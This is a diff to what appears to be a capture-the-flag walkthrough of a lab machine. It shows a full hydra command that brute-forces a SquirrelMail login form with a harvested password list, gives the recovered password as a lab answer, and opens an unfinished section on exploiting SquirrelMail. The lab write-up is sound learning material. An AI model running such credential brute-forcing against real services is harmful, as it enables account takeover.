@@ -71,12 +71,18 @@ SCREENSHOT9<br />
 log1.txt looks like it's full of passwords or usernames. Maybe we could try the possible username "Miles" or "MilesDyson" with this password list? 
 I see there's nothing inside of the log2.txt and log3.txt so I remove those.<br /></p>
 
-<p>Let's try bruteforcing the user "Miles" with the passwords we got from "log1.txt" on the squirrelmail service. 
-We know there's a vulnerability in the SquirrelMail service with an available exploit. To do this we will use hydra< br/>
-hydra -l Miles -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"<br />
-Success! We have successfuly logged in with the password "cyborg007haloterminator"
+<p>Let's try bruteforcing the user "milesdyson" with the passwords we got from "log1.txt" on the squirrelmail service. 
+We know there's a vulnerability in the SquirrelMail service with an available exploit. To do this we will use hydra and burp suite.<br />
+hydra -l milesdyson -P log1.txt 10.10.90.192 http-post-form "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user:H=Cookie: squirrelmail_language=en_US; SQMSESSID=jbgcof2ofcgqh0jb5ukapj8pu3;"<br />
+Success! We have successfuly logged in with the password "cyborg007haloterminator"<br />
+Question 1:<br />
+**What is Miles password for his emails?** cyborg007haloterminator
 </p>
 
+## Exploiting Vulnerabilities
 
-Question 1:<br />
-**What is Miles password for his emails?** - cyborg007haloterminator
+Now that we have a login for the SquirrelMail server, we know about a vulnerability in this version and we know about an exploit for this service.
+Let's get to it!
+
+### Exploiting SquirrelMail
+
